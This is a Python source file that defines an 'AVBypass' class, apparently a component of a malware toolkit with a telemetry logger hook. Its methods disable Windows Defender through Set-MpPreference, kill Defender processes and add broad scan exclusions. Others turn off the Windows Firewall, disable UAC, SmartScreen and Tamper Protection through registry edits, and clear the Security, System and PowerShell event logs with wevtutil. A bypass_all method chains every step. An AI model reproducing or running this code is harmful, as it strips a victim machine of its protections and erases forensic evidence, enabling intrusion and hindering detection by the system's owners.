"""
Ultimate Antivirus Bypass
Combines multiple techniques for maximum evasion
"""

import subprocess
import os
import sys
import time
import winreg


class AVBypass:
    """Complete AV bypass suite"""

    def __init__(self, tel_logger_func=None):
        self.tel_logger = tel_logger_func

    def log(self, msg):
        print(msg)
        if self.tel_logger:
            self.tel_logger(msg)

    def disable_defender(self):
        """Disable Windows Defender completely"""
        commands = [
            # Disable real-time protection
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
            'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
            'powershell -Command "Set-MpPreference -DisablePrivacyMode $true"',
            'powershell -Command "Set-MpPreference -DisableScriptScanning $true"',
            'powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"',

            # Disable cloud-delivered protection
            'powershell -Command "Set-MpPreference -MAPSReporting 0"',

            # Disable automatic sample submission
            'powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"',

            # Kill Defender processes
            'taskkill /F /IM MsMpEng.exe',
            'taskkill /F /IM MpCmdRun.exe',
            'taskkill /F /IM SecurityHealthSystray.exe',
        ]

        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, capture_output=True)
            except:
                pass

        self.log("[AV BYPASS] Windows Defender disabled")

    def add_exclusions(self):
        """Add exclusions to Windows Defender"""
        paths = [
            os.getenv('APPDATA'),
            os.getenv('TEMP'),
            os.getenv('LOCALAPPDATA'),
            'C:\\Users',
            'C:\\Windows\\Temp'
        ]

        for path in paths:
            cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{path}\'"'
            try:
                subprocess.run(cmd, shell=True, capture_output=True)
            except:
                pass

        self.log("[AV BYPASS] Added exclusions")

    def disable_firewall(self):
        """Disable Windows Firewall"""
        commands = [
            'netsh advfirewall set allprofiles state off',
            'netsh firewall set opmode mode=disable',
        ]

        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, capture_output=True)
            except:
                pass

        self.log("[AV BYPASS] Firewall disabled")

    def disable_uac(self):
        """Disable UAC"""
        try:
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ)
            uac_value, _ = winreg.QueryValueEx(key, "EnableLUA")
            winreg.CloseKey(key)

            if uac_value == 0:
                return

            subprocess.call([
                "reg", "add",
                r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
                "/v", "EnableLUA",
                "/t", "REG_DWORD",
                "/d", "0",
                "/f"
            ], shell=True, capture_output=True)

            self.log("[AV BYPASS] UAC disabled")
        except:
            pass

    def disable_smartscreen(self):
        """Disable SmartScreen"""
        try:
            subprocess.run(
                r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f',
                shell=True, capture_output=True
            )
            self.log("[AV BYPASS] SmartScreen disabled")
        except:
            pass

    def disable_tamper_protection(self):
        """Disable Tamper Protection"""
        try:
            subprocess.run(
                r'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
                shell=True, capture_output=True
            )
            self.log("[AV BYPASS] Tamper Protection disabled")
        except:
            pass

    def clear_event_logs(self):
        """Clear Windows Event Logs"""
        logs = ['Application', 'Security', 'System', 'Windows PowerShell']

        for log in logs:
            try:
                subprocess.run(f'wevtutil cl "{log}"', shell=True, capture_output=True)
            except:
                pass

        self.log("[AV BYPASS] Event logs cleared")

    def bypass_all(self):
        """Execute all bypass techniques"""
        self.log("[AV BYPASS] Starting complete bypass...")

        self.disable_defender()
        time.sleep(1)

        self.add_exclusions()
        time.sleep(1)

        self.disable_firewall()
        time.sleep(1)

        self.disable_uac()
        time.sleep(1)

        self.disable_smartscreen()
        time.sleep(1)

        self.disable_tamper_protection()
        time.sleep(1)

        self.clear_event_logs()

        self.log("[AV BYPASS] Complete bypass executed!")